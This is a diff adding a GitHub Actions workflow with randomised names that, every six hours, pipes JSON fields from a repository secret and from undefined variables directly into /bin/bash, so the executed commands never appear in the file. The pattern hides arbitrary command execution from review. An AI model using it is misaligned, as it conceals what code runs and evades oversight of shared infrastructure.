@@ -1,0 +1,28 @@
+name: yaoxianzhi7129
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yaoxianzhi7129
+        env:
+          l55419: ${{ secrets.l55419 }}
+        run: |
+          echo $l55419 | jq -r .v2 | /bin/bash
+          echo $jwsy756 | jq -r .r11 | /bin/bash
+          echo $tyym07 | jq -r .as0175 | /bin/bash
+          echo $l10321 | jq -r .ku6956 | /bin/bash
+          echo $eqa2 | jq -r .a2 | /bin/bash
+          echo $g3 | jq -r .dqtmm0981 | /bin/bash
+          echo $mt1 | jq -r .a07 | /bin/bash
+          echo $n3 | jq -r .dhbg34637 | /bin/bash
+          echo $jrbh1675 | jq -r .ppoq31 | /bin/bash
+          echo $bsf079 | jq -r .ejulf37403 | /bin/bash
+
